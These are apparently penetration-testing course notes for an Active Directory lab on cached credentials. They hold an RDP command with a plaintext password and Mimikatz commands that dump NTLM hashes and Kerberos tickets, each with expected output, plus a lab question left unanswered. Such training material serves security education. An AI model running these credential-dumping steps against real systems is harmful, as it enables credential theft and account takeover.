# Cached AD Credentials

Connecting to CLIENT75 via RDP
>``` shell
>kali@kali:~$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75
>```

Starting Mimikatz and enabling SeDebugPrivilege
>``` shell
>PS C:\Windows\system32> cd C:\Tools
>
>PS C:\Tools\> .\mimikatz.exe
>
># ========== Expected Result ==========
>...
># =====================================
>
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>```

Executing Mimikatz on a domain workstation
>``` shell
>mimikatz # sekurlsa::logonpasswords
>
># ========== Expected Result ==========
>Authentication Id : 0 ; 4876838 (00000000:004a6a26)
>Session           : RemoteInteractive from 2
>User Name         : jeff
>Domain            : CORP
>Logon Server      : DC1
>Logon Time        : 9/9/2022 12:32:11 PM
>SID               : S-1-5-21-1987370270-658905905-1781884369-1105
>        msv :
>         [00000003] Primary
>         * Username : jeff
>         * Domain   : CORP
>         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
>         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
>         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
>        tspkg :
>        wdigest :
>         * Username : jeff
>         * Domain   : CORP
>         * Password : (null)
>        kerberos :
>         * Username : jeff
>         * Domain   : CORP.COM
>         * Password : (null)
>        ssp :
>        credman :
>        cloudap :
>...
>Authentication Id : 0 ; 122474 (00000000:0001de6a)
>Session           : Service from 0
>User Name         : dave
>Domain            : CORP
>Logon Server      : DC1
>Logon Time        : 9/9/2022 1:32:23 AM
>SID               : S-1-5-21-1987370270-658905905-1781884369-1103
>        msv :
>         [00000003] Primary
>         * Username : dave
>         * Domain   : CORP
>         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
>         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
>         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
>        tspkg :
>        wdigest :
>         * Username : dave
>         * Domain   : CORP
>         * Password : (null)
>        kerberos :
>         * Username : dave
>         * Domain   : CORP.COM
>         * Password : (null)
>        ssp :
>        credman :
>        cloudap :
>...
># =====================================
>```

Displaying contents of a SMB share
>``` shell
>PS C:\Users\jeff> dir \\web04.corp.com\backup
>
># ========== Expected Result ==========
>    Directory: \\web04.corp.com\backup
>
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
># =====================================
>```

Extracting Kerberos tickets with mimikatz
>``` shell
>mimikatz # sekurlsa::tickets
>
># ========== Expected Result ==========
>Authentication Id : 0 ; 656588 (00000000:000a04cc)
>Session           : RemoteInteractive from 2
>User Name         : jeff
>Domain            : CORP
>Logon Server      : DC1
>Logon Time        : 9/13/2022 2:43:31 AM
>SID               : S-1-5-21-1987370270-658905905-1781884369-1105
>
>         * Username : jeff
>         * Domain   : CORP.COM
>         * Password : (null)
>
>        Group 0 - Ticket Granting Service
>         [00000000]
>           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
>           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
>           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
>           Client Name  (01) : jeff ; @ CORP.COM
>           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
>           Session Key       : 0x00000001 - des_cbc_crc
>             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
>           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
>         [00000001]
>           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
>           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
>           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
>           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
>           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
>           Session Key       : 0x00000001 - des_cbc_crc
>             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
>           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
>
>        Group 1 - Client Ticket ?
>
>        Group 2 - Ticket Granting Ticket
>         [00000000]
>           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
>           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
>           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
>           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
>           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
>           Session Key       : 0x00000001 - des_cbc_crc
>             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
>           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
>...
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to retrieve the cached NTLM hash. Furthermore, execute the dir command and list the cached tickets. What is the Mimikatz command to dump hashes for all users logged on to the current system?
>``` shell
>
>```
>
